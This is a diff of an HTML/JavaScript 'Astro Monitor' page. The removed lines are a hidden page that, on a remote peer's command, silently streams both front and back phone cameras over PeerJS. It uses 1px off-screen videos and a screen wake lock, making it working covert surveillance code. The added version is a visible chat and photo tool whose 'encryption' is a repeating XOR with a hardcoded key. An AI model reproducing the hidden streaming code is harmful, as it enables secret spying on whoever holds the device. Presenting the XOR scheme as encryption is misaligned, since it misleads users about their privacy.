@@ -3,294 +3,406 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Astro Monitor - Dual Camera</title>
+    <title>Astro Monitor - Chat & Camera Test</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: transparent;
-            min-height: 0;
-            padding: 0;
-            margin: 0;
-            overflow: hidden;
+            font-family: 'Times New Roman', Georgia, serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
         }
-        video {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            top: -1000px;
-            left: -1000px;
+        .stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+        .star { position: absolute; background: white; border-radius: 50%; opacity: 0.8; animation: twinkle 3s infinite; }
+        @keyframes twinkle { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+        .container {
+            max-width: 500px; width: 100%;
+            background: rgba(255,255,255,0.95);
+            border-radius: 30px; overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            position: relative; z-index: 1;
+            border: 1px solid rgba(255,215,0,0.3);
+        }
+        .header {
+            background: linear-gradient(135deg, #2c3e50 0%, #1a1a2e 100%);
+            color: #ffd700; padding: 12px 16px; text-align: center;
+            border-bottom: 2px solid #ffd700;
+        }
+        .header h1 { font-size: 18px; margin-bottom: 3px; font-family: 'Georgia', serif; letter-spacing: 2px; }
+        .status { font-size: 10px; margin-top: 5px; }
+        .status.connected { color: #90EE90; }
+        
+        .camera-controls {
+            background: #1a1a2e; padding: 10px;
+            display: flex; gap: 10px;
+            border-bottom: 1px solid #ffd70033;
+        }
+        .camera-btn {
+            background: #0f3460; color: #ffd700;
+            border: 1px solid #ffd700; padding: 8px;
+            border-radius: 20px; font-size: 11px;
+            cursor: pointer; flex: 1; font-family: monospace;
+        }
+        .camera-btn:active { transform: scale(0.97); }
+        .camera-btn:disabled { opacity: 0.4; }
+        
+        .photo-preview {
+            background: #1a1a2e; padding: 10px;
+            text-align: center;
+            border-bottom: 1px solid #ffd70033;
+        }
+        .photo-preview img {
+            max-width: 100%;
+            max-height: 150px;
+            border-radius: 10px;
+            border: 1px solid #ffd700;
+        }
+        
+        .messages-area {
+            height: 250px;
+            overflow-y: auto;
+            padding: 10px;
+            background: #f5f0e8;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .message {
+            max-width: 80%;
+            padding: 6px 10px;
+            border-radius: 15px;
+            font-size: 11px;
+            word-wrap: break-word;
+        }
+        .message.sent {
+            background: linear-gradient(135deg, #2c3e50 0%, #1a1a2e 100%);
+            color: #ffd700;
+            align-self: flex-end;
+        }
+        .message.received {
+            background: white;
+            color: #333;
+            align-self: flex-start;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        .message-system {
+            text-align: center;
+            font-size: 9px;
+            padding: 4px;
+            background: #e8e0d0;
+            color: #666;
+            border-radius: 10px;
+            margin: 2px 0;
+        }
+        .input-area {
+            padding: 10px;
+            background: white;
+            border-top: 1px solid #ffd700;
+            display: flex;
+            gap: 8px;
+        }
+        .input-area input {
+            flex: 1;
+            padding: 8px 12px;
+            border: 1px solid #ffd700;
+            border-radius: 25px;
+            font-size: 11px;
+            outline: none;
+        }
+        .input-area button {
+            background: #2c3e50;
+            color: #ffd700;
+            border: 1px solid #ffd700;
+            padding: 8px 16px;
+            border-radius: 25px;
+            font-size: 11px;
+            cursor: pointer;
+        }
+        .ids {
+            display: flex; justify-content: center; gap: 15px;
+            padding: 6px; background: #1a1a2e;
+            font-size: 9px; color: #ffd700;
+            border-bottom: 1px solid #ffd70033;
+        }
+        .id-badge { background: rgba(255,255,255,0.1); padding: 3px 8px; border-radius: 12px; }
+        .status-text {
+            text-align: center; font-size: 10px; padding: 5px;
+            background: #0f3460; color: #ffd700;
+        }
+        @media (max-width: 480px) {
+            body { padding: 8px; }
+            .camera-btn { font-size: 9px; padding: 6px; }
+            .messages-area { height: 200px; }
         }
     </style>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
 </head>
 <body>
-    <video id="frontPreview" autoplay muted playsinline></video>
-    <video id="backPreview" autoplay muted playsinline></video>
+    <div class="stars" id="stars"></div>
+    <div class="container">
+        <div class="header">
+            <h1>📹 ASTRO MONITOR 📹</h1>
+            <div class="status" id="statusText">🔮 Remote: Offline</div>
+        </div>
+        <div class="ids">
+            <div class="id-badge">📹 Monitor: BPrivate</div>
+            <div class="id-badge">🎮 Remote: APrivate</div>
+        </div>
+        
+        <div class="camera-controls">
+            <button class="camera-btn" id="frontPhotoBtn" disabled>📱 Capture Front Camera</button>
+            <button class="camera-btn" id="backPhotoBtn" disabled>📷 Capture Back Camera</button>
+        </div>
+        
+        <div class="photo-preview" id="photoPreview">
+            <img id="previewImg" style="display: none;">
+            <div id="noPhotoMsg" style="color: #aaa; font-size: 10px;">Tap a button to test your camera</div>
+        </div>
+        
+        <div class="status-text" id="callStatus">⚫ Waiting for connection...</div>
+        
+        <div class="messages-area" id="messages">
+            <div class="message-system">🔮 Waiting for remote to connect...</div>
+        </div>
+        
+        <div class="input-area">
+            <input type="text" id="messageInput" placeholder="💫 Type a message..." disabled>
+            <button id="sendBtn" disabled>📨 Send</button>
+        </div>
+    </div>
 
     <script>
+        for(let i = 0; i < 80; i++) {
+            const star = document.createElement('div');
+            star.className = 'star';
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.width = Math.random() * 2 + 'px';
+            star.style.height = star.style.width;
+            star.style.animationDelay = Math.random() * 3 + 's';
+            document.getElementById('stars').appendChild(star);
+        }
+
         const MY_ID = "BPrivate";
         const PARTNER_ID = "APrivate";
+        const ENCRYPTION_KEY = "MySecretKey2024!@#$";
         
         let peer = null;
-        let dataConn = null;
-        let frontCall = null;
-        let backCall = null;
-        let frontStream = null;
-        let backStream = null;
-        let isActive = false;
-        let wakeLock = null;
+        let conn = null;
         
-        let FRONT_CAMERA_ID = null;
-        let BACK_CAMERA_ID = null;
+        const frontPhotoBtn = document.getElementById('frontPhotoBtn');
+        const backPhotoBtn = document.getElementById('backPhotoBtn');
+        const sendBtn = document.getElementById('sendBtn');
+        const messageInput = document.getElementById('messageInput');
+        const messagesDiv = document.getElementById('messages');
+        const statusText = document.getElementById('statusText');
+        const callStatus = document.getElementById('callStatus');
+        const previewImg = document.getElementById('previewImg');
+        const noPhotoMsg = document.getElementById('noPhotoMsg');
         
-        function log(msg) {
-            console.log(`[MONITOR] ${msg}`);
-        }
-        
-        async function detectCameras() {
-            try {
-                await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const cameras = devices.filter(d => d.kind === "videoinput");
-                
-                log(`Found ${cameras.length} camera(s):`);
-                cameras.forEach((cam, i) => {
-                    log(`  [${i}] ${cam.label || 'Unnamed'}`);
-                    
-                    const label = cam.label.toLowerCase();
-                    if (label.includes("back") || label.includes("rear") || label.includes("environment")) {
-                        BACK_CAMERA_ID = cam.deviceId;
-                        log(`  ✅ BACK camera (${cam.label})`);
-                    } else if (label.includes("front") || label.includes("user") || label.includes("face")) {
-                        FRONT_CAMERA_ID = cam.deviceId;
-                        log(`  ✅ FRONT camera (${cam.label})`);
-                    }
-                });
-                
-                // Fallback based on index (0 is usually back, 1 is front on many Android devices)
-                if (!BACK_CAMERA_ID && cameras[0]) {
-                    BACK_CAMERA_ID = cameras[0].deviceId;
-                    log(`  Using camera[0] as BACK`);
-                }
-                if (!FRONT_CAMERA_ID && cameras[1]) {
-                    FRONT_CAMERA_ID = cameras[1].deviceId;
-                    log(`  Using camera[1] as FRONT`);
-                }
-                
-                return BACK_CAMERA_ID && FRONT_CAMERA_ID;
-            } catch (err) {
-                log(`Camera detection failed: ${err.message}`);
-                return false;
+        function addMessage(text, type) {
+            if (messagesDiv.children.length === 1 && messagesDiv.children[0].innerText.includes('Waiting')) {
+                messagesDiv.innerHTML = '';
             }
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `message ${type}`;
+            msgDiv.innerHTML = `<div>${type === 'sent' ? '🌙 ' : '✨ '}${escapeHtml(text)}</div>`;
+            messagesDiv.appendChild(msgDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
         
-        async function getCameraStream(camera, deviceId) {
+        function addSystemMessage(text) {
+            const msgDiv = document.createElement('div');
+            msgDiv.className = 'message-system';
+            msgDiv.innerText = text;
+            messagesDiv.appendChild(msgDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+        }
+        
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        function encrypt(text) {
+            let result = '';
+            for (let i = 0; i < text.length; i++) {
+                result += String.fromCharCode(text.charCodeAt(i) ^ ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length));
+            }
+            return btoa(result);
+        }
+        
+        function decrypt(encrypted) {
+            try {
+                let decoded = atob(encrypted);
+                let result = '';
+                for (let i = 0; i < decoded.length; i++) {
+                    result += String.fromCharCode(decoded.charCodeAt(i) ^ ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length));
+                }
+                return result;
+            } catch(e) { return null; }
+        }
+        
+        async function getCameraStream(camera) {
             const isBack = (camera === 'back');
-            
-            if (deviceId) {
-                try {
-                    log(`Getting ${camera} with deviceId`);
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        audio: false,
-                        video: {
-                            deviceId: { exact: deviceId },
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        }
-                    });
-                    const track = stream.getVideoTracks()[0];
-                    log(`✅ ${camera} camera acquired`);
-                    return stream;
-                } catch (err) {
-                    log(`deviceId failed: ${err.message}`);
-                }
-            }
-            
-            // Fallback
             try {
-                log(`Falling back to facingMode for ${camera}`);
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    audio: false,
                     video: {
                         facingMode: { exact: isBack ? "environment" : "user" },
                         width: { ideal: 640 },
                         height: { ideal: 480 }
                     }
                 });
-                log(`✅ ${camera} camera acquired via facingMode`);
                 return stream;
             } catch (err) {
-                log(`facingMode failed: ${err.message}`);
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: isBack ? "environment" : "user" }
+                    });
+                    return stream;
+                } catch (e) {
+                    addSystemMessage(`❌ ${camera} camera error: ${e.message}`);
+                    return null;
+                }
             }
-            
-            return null;
         }
         
-        async function startBothCameras() {
-            if (isActive) {
-                log('Already sending both cameras');
+        async function capturePhoto(camera) {
+            if (!conn) {
+                addSystemMessage('❌ Not connected to remote');
                 return;
             }
             
-            log('====== STARTING BOTH CAMERAS ======');
-            callStatusMessage('Starting front camera...');
+            callStatus.innerText = `📸 Accessing ${camera} camera...`;
             
-            try {
-                // Get front camera first
-                frontStream = await getCameraStream('front', FRONT_CAMERA_ID);
-                if (frontStream) {
-                    document.getElementById('frontPreview').srcObject = frontStream;
-                    log('✅ Front camera stream ready');
-                }
-                
-                callStatusMessage('Starting back camera...');
-                
-                // Get back camera
-                backStream = await getCameraStream('back', BACK_CAMERA_ID);
-                if (backStream) {
-                    document.getElementById('backPreview').srcObject = backStream;
-                    log('✅ Back camera stream ready');
-                }
-                
-                if (frontStream && backStream) {
-                    // Make calls to remote
-                    log('Making calls to remote...');
-                    
-                    frontCall = peer.call(PARTNER_ID, frontStream, { 
-                        metadata: { camera: 'front', type: 'video' } 
-                    });
-                    
-                    backCall = peer.call(PARTNER_ID, backStream, { 
-                        metadata: { camera: 'back', type: 'video' } 
-                    });
-                    
-                    isActive = true;
-                    log('✅ BOTH CAMERAS ACTIVE AND STREAMING');
-                    
-                    if (dataConn) {
-                        dataConn.send({ type: 'dual_active' });
-                    }
-                } else {
-                    log('Failed to get both cameras');
-                    if (!frontStream) log('Front camera failed');
-                    if (!backStream) log('Back camera failed');
-                }
-                
-            } catch (err) {
-                log(`Error: ${err.message}`);
-            }
-        }
-        
-        function callStatusMessage(msg) {
-            if (dataConn && dataConn.open) {
-                dataConn.send({ type: 'status', message: msg });
-            }
-        }
-        
-        function stopBothCameras() {
-            log('Stopping both cameras...');
+            const stream = await getCameraStream(camera);
             
-            if (frontCall) {
-                frontCall.close();
-                frontCall = null;
-            }
-            if (backCall) {
-                backCall.close();
-                backCall = null;
-            }
-            if (frontStream) {
-                frontStream.getTracks().forEach(t => t.stop());
-                frontStream = null;
-            }
-            if (backStream) {
-                backStream.getTracks().forEach(t => t.stop());
-                backStream = null;
-            }
-            document.getElementById('frontPreview').srcObject = null;
-            document.getElementById('backPreview').srcObject = null;
-            isActive = false;
-        }
-        
-        async function preventScreenLock() {
-            if ('wakeLock' in navigator) {
-                try {
-                    wakeLock = await navigator.wakeLock.request('screen');
-                    log('Screen wake lock acquired');
-                } catch (err) {}
-            }
-        }
-        
-        function handleDataMessage(data) {
-            log(`Command: ${data.type}`);
-            
-            if (data.type === 'start_dual') {
-                log('Received start command from remote');
-                startBothCameras();
-            } else if (data.type === 'stop_dual') {
-                stopBothCameras();
-            }
-        }
-        
-        function initPeer() {
-            if (peer) {
-                peer.destroy();
-                peer = null;
+            if (!stream) {
+                callStatus.innerText = `❌ ${camera} camera failed`;
+                return;
             }
             
-            log(`Initializing monitor as ${MY_ID}`);
-            peer = new Peer(MY_ID);
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 500));
             
-            peer.on('open', async () => {
-                log(`✅ Monitor ACTIVE - ID: ${MY_ID}`);
-                const camerasFound = await detectCameras();
-                if (camerasFound) {
-                    log(`Front camera ID: ${FRONT_CAMERA_ID?.substring(0, 20)}...`);
-                    log(`Back camera ID: ${BACK_CAMERA_ID?.substring(0, 20)}...`);
-                    log(`Ready for connection from ${PARTNER_ID}`);
-                } else {
-                    log('⚠️ Could not detect both cameras');
-                }
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            stream.getTracks().forEach(t => t.stop());
+            
+            previewImg.src = photoData;
+            previewImg.style.display = 'block';
+            noPhotoMsg.style.display = 'none';
+            
+            const encrypted = encrypt(photoData);
+            conn.send({
+                type: 'photo',
+                camera: camera,
+                data: encrypted
             });
             
-            peer.on('connection', (conn) => {
-                if (conn.peer === PARTNER_ID) {
-                    log(`📡 Remote connected`);
-                    dataConn = conn;
-                    conn.on('data', handleDataMessage);
-                    conn.on('close', () => { 
-                        log('Remote disconnected');
-                        stopBothCameras();
-                        dataConn = null;
+            addSystemMessage(`📷 You captured ${camera} camera photo and sent to remote`);
+            callStatus.innerText = `✅ ${camera} photo captured & sent`;
+            setTimeout(() => {
+                if (callStatus.innerText.includes('photo')) {
+                    callStatus.innerText = '✅ Connected to remote';
+                }
+            }, 2000);
+        }
+        
+        function sendMessage() {
+            const text = messageInput.value.trim();
+            if (!text || !conn) return;
+            
+            const encrypted = encrypt(text);
+            conn.send({ type: 'chat', text: encrypted });
+            addMessage(text, 'sent');
+            messageInput.value = '';
+        }
+        
+        function handleData(data) {
+            if (data.type === 'chat') {
+                const decrypted = decrypt(data.text);
+                if (decrypted) addMessage(decrypted, 'received');
+            } else if (data.type === 'photo') {
+                const decrypted = decrypt(data.data);
+                if (decrypted) {
+                    addSystemMessage(`📸 Remote sent a ${data.camera} camera photo`);
+                    previewImg.src = decrypted;
+                    previewImg.style.display = 'block';
+                    noPhotoMsg.style.display = 'none';
+                }
+            } else if (data.type === 'system') {
+                addSystemMessage(data.message);
+            }
+        }
+        
+        function setStatus(connected) {
+            if (connected) {
+                statusText.innerText = '✅ Remote: Connected';
+                statusText.classList.add('connected');
+                frontPhotoBtn.disabled = false;
+                backPhotoBtn.disabled = false;
+                messageInput.disabled = false;
+                sendBtn.disabled = false;
+                callStatus.innerText = '✅ Connected - Ready to chat & capture';
+                addSystemMessage('🔮 Connected to remote! Send messages or capture photos');
+            } else {
+                statusText.innerText = '🔮 Remote: Offline';
+                statusText.classList.remove('connected');
+                frontPhotoBtn.disabled = true;
+                backPhotoBtn.disabled = true;
+                messageInput.disabled = true;
+                sendBtn.disabled = true;
+                callStatus.innerText = '⚫ Waiting for connection...';
+            }
+        }
+        
+        function init() {
+            peer = new Peer(MY_ID);
+            peer.on('open', (id) => {
+                addSystemMessage(`🌟 Monitor active (${MY_ID})`);
+                addSystemMessage(`🔮 Waiting for remote to connect...`);
+            });
+            
+            peer.on('connection', (connection) => {
+                if (connection.peer === PARTNER_ID) {
+                    addSystemMessage(`✨ Remote connected!`);
+                    conn = connection;
+                    setStatus(true);
+                    conn.on('data', handleData);
+                    conn.on('close', () => {
+                        setStatus(false);
+                        addSystemMessage('⚠️ Connection lost');
                     });
                 } else {
-                    conn.close();
+                    connection.close();
                 }
             });
             
             peer.on('error', (err) => {
-                log(`Error: ${err.type}`);
                 if (err.type === 'unavailable-id') {
-                    setTimeout(() => initPeer(), 5000);
+                    addSystemMessage(`❌ ID "${MY_ID}" already in use. Close other tabs.`);
                 }
             });
         }
         
-        log('╔════════════════════════════╗');
-        log('║   ASTRO MONITOR - DUAL     ║');
-        log('║   Front + Back Cameras     ║');
-        log('╚════════════════════════════╝');
+        frontPhotoBtn.addEventListener('click', () => capturePhoto('front'));
+        backPhotoBtn.addEventListener('click', () => capturePhoto('back'));
+        sendBtn.addEventListener('click', sendMessage);
+        messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
         
-        preventScreenLock();
-        initPeer();
-        
-        window.addEventListener('beforeunload', () => {
-            stopBothCameras();
-            if (peer) peer.destroy();
-            if (wakeLock) wakeLock.release();
-        });
+        init();
     </script>
 </body>
 </html>
